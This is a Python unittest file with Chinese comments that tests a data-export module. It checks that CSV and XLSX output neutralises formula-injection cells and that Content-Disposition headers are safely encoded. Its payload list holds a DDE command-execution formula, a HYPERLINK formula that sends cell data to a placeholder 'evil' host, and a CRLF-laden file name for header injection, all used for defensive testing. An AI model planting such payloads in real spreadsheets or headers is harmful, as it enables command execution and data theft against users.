"""导出工具行为测试：公式注入清洗与 Content-Disposition 编码（纯函数，无需数据库）。"""

from __future__ import annotations

import io
import unittest

from openpyxl import load_workbook

from api.export import attachment_disposition, csv_bytes, xlsx_bytes

COLS = [("名称", lambda r: r["name"])]
PAYLOADS = ["=cmd|'/c calc'!A1", "+HYPERLINK(\"http://evil/?\"&A1,\"x\")", "-2+cmd()", "@SUM(A1:A9)",
            "\tabc", "\rcrlf"]


class FormulaInjectionTests(unittest.TestCase):
    def test_csv_neutralizes_formula_cells(self) -> None:
        for payload in PAYLOADS:
            with self.subTest(payload=payload[:12]):
                text = csv_bytes([{"name": payload}], COLS).decode("utf-8-sig")
                for line in text.splitlines():
                    self.assertFalse(line[:1] in ("=", "+", "-", "@", "\t"), f"CSV 行仍以公式字符开头: {line!r}")

    def test_xlsx_neutralizes_formula_cells(self) -> None:
        for payload in PAYLOADS:
            with self.subTest(payload=payload[:12]):
                workbook = load_workbook(io.BytesIO(xlsx_bytes([{"name": payload}], COLS)))
                cell = workbook.active.cell(row=2, column=1)
                self.assertNotEqual(cell.data_type, "f", "XLSX 单元格仍是公式类型")
                self.assertTrue(str(cell.value).startswith("'"))

    def test_normal_values_untouched(self) -> None:
        from datetime import date
        from decimal import Decimal
        text = csv_bytes([{"name": "普通中文名"}, {"name": "x=y 不在开头"}, {"name": Decimal("12.30")}, {"name": date(2026, 1, 2)}], COLS).decode("utf-8-sig")
        self.assertIn("普通中文名", text)
        self.assertIn("x=y 不在开头", text)
        self.assertIn("12.30", text)
        self.assertIn("2026-01-02", text)


class DispositionTests(unittest.TestCase):
    def test_ascii_name_and_rfc5987(self) -> None:
        header = attachment_disposition("合同扫描件.txt")
        self.assertIn("filename*=UTF-8''", header)
        self.assertIn("%E5%90%88%E5%90%8C", header)  # 「合同」的百分号编码
        header.encode("latin-1")  # 必须可 latin-1 编码（响应头约束）

    def test_quotes_and_crlf_stripped_from_ascii_fallback(self) -> None:
        header = attachment_disposition('bad"\r\nname.bin')
        header.encode("latin-1")
        ascii_part = header.split(";")[1].strip()
        self.assertNotIn('"', ascii_part.replace('filename="', "").rstrip('"')[1:-1])
        self.assertNotIn("\r", header)
        self.assertNotIn("\n", header)


if __name__ == "__main__":
    unittest.main()
